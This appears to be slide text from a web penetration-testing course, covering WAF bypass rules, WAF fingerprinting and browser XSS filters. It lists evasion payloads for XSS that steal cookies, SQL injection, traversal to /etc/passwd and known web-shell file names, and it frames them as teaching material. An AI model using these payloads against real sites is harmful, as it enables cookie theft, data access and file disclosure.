WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.101
1.2.2.1 Simple Rules to Bypass WAFs
Cross-Site Scripting
Instead of using: The best choice is:
▼ alert(‘xss’) ▲ prompt('xss')
▼ alert(1) ▲ prompt(8)
▲ confirm('xss')
▲ confirm(8)
▲ alert(/xss/.source)
DO
▲ window[/alert/.source](8)
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.102
1.2.2.1 Simple Rules to Bypass WAFs
Cross-Site Scripting
Instead of using: The best choice is:
▼ alert(document.cookie) ▲ with(document)alert(cookie)
▲ alert(document['cookie'])
▲ alert(document[/cookie/.source])
▲ alert(document[/coo/.source+/kie/.so
urce])
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.103
1.2.2.1 Simple Rules to Bypass WAFs
Cross-Site Scripting
Instead of using: The best choice is:
▲ 
▲ 
▲ 
▲ 
▲ javascript:alert(document.cookie)
▲ data:text/html;base64,PHNjcmlwdD5h
bGVydCgnWFNTJyk8L3NjcmlwdD4=
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.104
1.2.2.1 Simple Rules to Bypass WAFs
Blind SQL Injection
Instead of using: The best choice is:
▼ ' or 1=1 ▲ ' or 6=6
▲ ' or 0x47=0x47
▲ or char(32)=' '
▲ or 6 is not null
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.105
1.2.2.1 Simple Rules to Bypass WAFs
SQL Injection
Instead of using: The best choice is:
▼ UNION SELECT ▲ UNION ALL SELECT
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.106
1.2.2.1 Simple Rules to Bypass WAFs
Directory Traversal
Instead of using: The best choice is:
▼ /etc/passwd ▲ /too/../etc/far/../passwd
▲ /etc//passwd
▲ /etc/ignore/../passwd
▲ /etc/passwd.......
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.107
1.2.2.1 Simple Rules to Bypass WAFs
Web Shell
Instead of using: The best choice is:
▲ c99.php
▲ augh.php
▲ r57.php
▲ shell.aspx
▲ cmd.jsp
▲ CmdAsp.asp
DO
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.108
1.2.2.2 WAF Detection and Fingerprinting
Usually WAFs work in passive mode, reactive mode, or
sometimes both. It depends on the period at which they are
installed. For example, once deployed, they can be in passive
mode, reducing the number of false positives and avoiding
blocking the application; however, once in production, most are
reactive.
Before testing a web application, it is extremely useful to know if
there is a WAF on the other side and what kind it is. WAF systems
leave several footprints of their presence, which allow us to
detect which WAF is in place. Let’s check out some techniques.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.109
1.2.2.2 WAF Detection and Fingerprinting
Cookie Values
Some WAF systems reveal their presence through cookies.
They release their own cookie during the HTTP
communications.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.110
1.2.2.2 WAF Detection and Fingerprinting
Cookie Values:
Citrix Netscaler uses some different cookies in the HTTP
responses like or or
ns_af citrix_ns_id NSC_
F5 BIG-IP ASM (Application Security Manager) uses
cookies starting with and followed with a string that
TS
respect the following regex:
^TS[a-zA-Z0-9]{3,6}
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.111
1.2.2.2 WAF Detection and Fingerprinting
Cookie Values:
Barracuda uses two cookies barra_counter_session and
BNI__BARRACUDA_LB_COOKIE.
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 8543
Content-Type: text/html
Expires: Tue, 08 Apr 2014 08:56:45 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Date: Tue, 08 Apr 2014 08:57:44 GMT
Set-Cookie: BNI__BARRACUDA_LB_COOKIE=000000000000000000000000c400000a0000bb20; Path=/
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.112
1.2.2.2 WAF Detection and Fingerprinting
Header Rewrite
Some WAFs rewrite the HTTP headers. Usually these
modify the header to deceive the attackers.
Server
For example, they either rewrite the header if the request is
malicious or, depending on the malicious request, remove
the HTTP header in the response.
Server
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.113
1.2.2.2 WAF Detection and Fingerprinting
Header Rewrite: Example – Rewrite Server Header
HTTP response for non-hostile request
HTTP/1.1 200 OK
Date: Mon, 7 Apr 2014 10:10:50 GMT
Server: Apache (Unix)
Content-Type: text/html
Content-Length: 2506
HTTP response for hostile request
HTTP/1.1 404 Not Found
Date: Mon, 7 Apr 2014 10:11:06 GMT
Server: Netscape-Enterprise/6.1
Content-Type: text/html;
Content-Length: 158
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.114
1.2.2.2 WAF Detection and Fingerprinting
HTTP Response Code
Some WAFs modify the HTTP response codes if the
request is hostile; for example:
mod_security >
406 Not Acceptable
AQTRONIX WebKnight >
999 No Hacking
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.115
1.2.2.2 WAF Detection and Fingerprinting
HTTP Response Body
It is also possible to detect the presence of the WAF plainly
in the response body.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.116
1.2.2.2 WAF Detection and Fingerprinting
HTTP Response Body: mod_security
HTTP/1.1 406 Not Acceptable
Date: Mon, 7 Apr 2014 11:10:50 GMT
Server: Apache
Content-Length: 226
Keep-Alive: timeout=10, max=30
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
Not Acceptable!Not Acceptable!
An appropriate representation of the requested resource could not be found on this server.
This error was generated by Mod_Security.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.117
1.2.2.2 WAF Detection and Fingerprinting
HTTP Response Body: AQTRONIX WebKnight
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.118
1.2.2.2 WAF Detection and Fingerprinting
HTTP Response Body: dotDefender
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.119
1.2.2.2 WAF Detection and Fingerprinting
Close Connection
An interesting feature supported by some WAFs is
.
close connection
It is useful in dropping the connection in the case the WAF
detects a malicious request.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.120
1.2.2.2 WAF Detection and Fingerprinting
Close Connection: mod_security
Here is a possible implementation with mod_security to
detect a brute force attack:
SecAction phase:1,id:109,initcol:ip=%{REMOTE_ADDR},nolog
SecRule ARGS:login "!^$"
"nolog,phase:1,id:110,setvar:ip.auth_attempt=+1,deprecatevar:ip.auth_attempt=20/120"
SecRule IP:AUTH_ATTEMPT "@gt 25"
"log,drop,phase:1,id:111,msg:'Possible Brute Force Attack'"
Source and Meaning > https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual#drop WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.121
1.2.2.2 WAF Detection and Fingerprinting
Many penetration testing tools have features to detect the
presence of a WAF. These features are both used as a first
step to understand how to craft payloads and if it is
needed.
An example would be to obfuscate the attack vector or use
a specific bypass.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.122
1.2.2.2 WAF Detection and Fingerprinting
The most well-known tool made by
Sandro Gauci and Wendel G.
Henrique is called wafw00f.
Wafw00f is a tool written in python
that can detect up to 20 different
WAF products.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.123
https://code.google.com/p/waffit/
1.2.2.2 WAF Detection and Fingerprinting
The techniques used to detect a WAF are similar to those
we have seen previously:
1. Cookies
2. Server Cloaking
3. Response Codes
4. Drop Action
5. Pre-Built-In Rules
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.124
1.2.2.2 WAF Detection and Fingerprinting
Scanning a website with wafw00f is very simple, and the
following image confirms it:
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.125
1.2.2.2 WAF Detection and Fingerprinting
As an addition to wafw00f you might want to use Nmap. It
contains a script that tries to detect the presence of a web
application firewall, its type and version.
The script file is http-waf-fingerprint and is authored by
Hani Benhabiles.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.126
http://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
1.2.2.2 WAF Detection and Fingerprinting
Scanning a website with nmap is as simple as running
wafw00f. We just require the script name to be in the
command:
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.127
1.2.2.2 WAF Detection and Fingerprinting
Another interesting resource is imperva-detect by Lamar
Spells. This utility is 100% focused on the detection of an
Imperva WAF and it runs 6 tests, one baseline and five
additional:
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.128
https://code.google.com/p/imperva-detect/
1.2.2.2 WAF Detection and Fingerprinting
The following image is an example of how to run imperva-
detect test scripts:
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.129
1.2.3 Client-Side Filters
Web Application Firewalls and libraries are filtering
solutions used to block web attacks, server-side at the
heart of web applications. Over the years, this has become
the "classic" and consolidated approach.
However, in the last ten years another approach has arisen.
The concept is to block web attacks client-side within web
browsers. These browsers are the primary mean used to
address attacks.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.130
1.2.3 Client-Side Filters
The goal of client-side defenses is to protect users against
vulnerabilities in web applications. Of course this approach
is not simple, and defenses need to be generic enough to
always be enabled. If they are not, they can become a
blocker for the browsers themselves and to their respective
users.
From an attacker's point of view, we want to understand
these mechanisms and how to bypass them. Our aim is the
target users who would otherwise be protected.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.131
1.2.3.1 Browser Add-ons
The first browser protection began in the open source
community.
The pioneer of the first valid solution was Giorgio Maone, in
late 2005, with the NoScript Security Suite extension for
Firefox.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.132
https://addons.mozilla.org/it/firefox/addon/noscript/
1.2.3.1 Browser Add-ons
NoScript is a whitelist-based
security tool that basically
disables all the executable
web content (JavaScript, Java,
Flash, Silverlight, …) and lets
the user choose which sites
are "trusted”, thus allowing the
use of these technologies.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.133
1.2.3.1 Browser Add-ons
NoScript is easy enough
to use; however, the
strongest point of this
extension is the extensive
list of security features
supported.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.134
1.2.3.1 Browser Add-ons
Among the features, the strong and powerful anti-XSS
protection is probably one of the most effective browser-
based solutions to prevent targeted malicious Web attacks.
WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.135
http://noscript.net/features#xss
1.2.3.2 Native Browser Filters
History
The first attempt at blocking malicious requests "natively”
(i.e. internally in the browser), was made by Microsoft and
introduced in Internet Explorer 8 as XSS Filter.
This filter attempts to block reflected XSS attacks by
applying regular expressions to response data.
http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part- WAPTXv2: Section 1, Module 1 -Caendra Inc. © 2020| p.136
iv-the-xss-filter.aspx
1.2.3.2 Native Browser Filters
History
After Microsoft, Google Chrome introduced their own cross-
site scripting filters, XSS Auditor.
This filter is slightly different from IE's XSS Filter and
NoScript. Instead of being layered on top of the browser, it
is integrated into WebKit/Blink, which are the rendering